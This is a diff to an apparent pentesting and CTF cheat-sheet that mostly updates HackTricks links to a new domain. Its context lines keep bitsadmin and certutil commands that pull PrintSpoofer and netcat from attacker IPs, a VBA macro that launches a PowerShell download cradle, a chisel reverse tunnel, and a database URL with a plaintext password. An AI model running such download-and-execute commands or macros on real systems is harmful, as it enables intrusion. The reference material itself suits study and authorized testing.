@@ -460,7 +460,7 @@ stty raw -echo; fg
 reset
 ```
 
-- [Full TTYs - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
+- [Full TTYs - HackTricks](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html)
 - [Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 - [Upgrading simple (reverse-)shells to fully interactive TTYs](https://gist.github.com/rollwagen/1fdb6b2a8cd47a33b1ecf70fea6aafde)
 
@@ -614,7 +614,7 @@ Target
 ./chisel client --max-retry-count 0 192.168.119.128:25 R:socks
 ```
 
-- [Tunneling and Port Forwarding - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
+- [Tunneling and Port Forwarding - HackTricks](https://book.hacktricks.wiki/en/generic-hacking/tunneling-and-port-forwarding.html)
 
 #### Lateral movement
 
@@ -668,7 +668,7 @@ bitsadmin /transfer pwn /download http://10.11.2.242/PrintSpoofer64.exe C:\Windo
 certutil.exe -urlcache -split -f "http://192.168.119.156/nc.exe" nc.exe
 ```
 
-- [Basic Win CMD for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#download)
+- [Basic Win CMD for Pentesters - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html#download)
 
 ##### VBA Macro
 
@@ -678,7 +678,7 @@ Str = "powershell -c ""$code=(New-Object System.Net.Webclient).DownloadString('h
 CreateObject("Wscript.Shell").Run Str
 ```
 
-- [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
+- [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html)
 
 ##### SMB file share
 
@@ -789,7 +789,7 @@ Prototype Pollution to RCE (PP2R)
 ### CSS Injection
 
 - [Testing for CSS Injection \| OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
-- [CSS Injection \| HackTricks](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection)
+- [CSS Injection - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xs-search/css-injection/index.html)
 - [CSS Injection \| XS-Leaks Wiki](https://xsleaks.dev/docs/attacks/css-injection/)
 - [CSSインジェクション \| 技術者ブログ \| 三井物産セキュアディレクション株式会社](https://www.mbsd.jp/research/20230403/css-injection/)
 - [Blind CSS Exfiltration: exfiltrate unknown web pages \| PortSwigger Research](https://portswigger.net/research/blind-css-exfiltration)
@@ -800,7 +800,7 @@ Prototype Pollution to RCE (PP2R)
 ### XS Leaks
 
 - [Introduction \| XS-Leaks Wiki](https://xsleaks.dev/)
-- [XS-Search/XS-Leaks \| HackTricks \| HackTricks](https://book.hacktricks.xyz/pentesting-web/xs-search)
+- [XS-Search/XS-Leaks - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xs-search.html)
 
 ### DOM Clobbering
 
@@ -886,7 +886,7 @@ Prototype Pollution to RCE (PP2R)
 
 ### Curated
 
-- [HackTricks](https://book.hacktricks.xyz/)
+- [HackTricks](https://book.hacktricks.wiki/)
 - [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/)
 
 ## CTF
@@ -1938,7 +1938,7 @@ Compiler / Build Packages
 
 ### Json Web Token (JWT)
 
-- [JWT Vulnerabilities (Json Web Tokens) - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
+- [JWT Vulnerabilities (Json Web Tokens) - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html)
 - [JWT - JSON Web Token - Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/JSON%20Web%20Token/)
 - [jwt_tool](https://github.com/ticarpi/jwt_tool)
   - [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
@@ -2109,7 +2109,7 @@ psql postgresql://webapp:7UxWFfLpsu4rJA94@127.0.0.1:5432/answers
 
 #### Install Oracle SQL*Plus DB client
 
-<https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation>
+- [Oracle Pentesting requirements installation \| HackTricks - Boitatech](https://hacktricks.boitatech.com.br/pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation)
 
 ```bat
 export PATH=$PATH:/opt/oracle/instantclient_21_7
@@ -2234,7 +2234,7 @@ RSA
 
 ### Hash Length Extension
 
-- [Hash Length Extension Attack - HackTricks](https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack)
+- [Hash Length Extension Attack - HackTricks](https://book.hacktricks.wiki/en/crypto-and-stego/hash-length-extension-attack.html)
 - [hash_extender](https://github.com/iagox86/hash_extender)
 
 Tested
@@ -2419,7 +2419,7 @@ openssl req -x509 -newkey rsa:4096 -noenc -out cert.pem -keyout key.pem -days 36
 
 ## Wi-Fi
 
-- [Pentesting Wifi \| HackTricks \| HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi)
+- [Pentesting Wifi - HackTricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/index.html)
 - [Wifi Hacking Tutorials](https://www.hackingtutorials.org/category/wifi-hacking-tutorials/)
 - [WPS PIN attacks: How to crack WPS-enabled Wi-Fi networks with Reaver](https://www.hackthebox.com/blog/wps-pin-attacks-and-cracking-wps-with-reaver)
 - [Brute forcing Wi-Fi Protected Setup by Stefan Viehböck in 2011](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf)
@@ -3239,7 +3239,7 @@ shortcut
 
 #### Sandbox Bypass / Jail
 
-- [Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
+- [Bypass Python sandboxes - HackTricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html)
 - [ctf-wiki-en/docs/pwn/linux/sandbox/python-sandbox-escape.md](https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/sandbox/python-sandbox-escape.md)
 - [Python Jails Escape \| Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-jails-escape/)
 - [Escaping the PyJail](https://lbarman.ch/blog/pyjail/)
@@ -3306,7 +3306,7 @@ Payload
 
 #### Decompile
 
-- [Decompile compiled python binaries (exe, elf) - Retreive from .pyc - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc)
+- [Decompile compiled python binaries (exe, elf) - Retreive from .pyc - HackTricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.html)
 
 #### YAML Deserialization
 
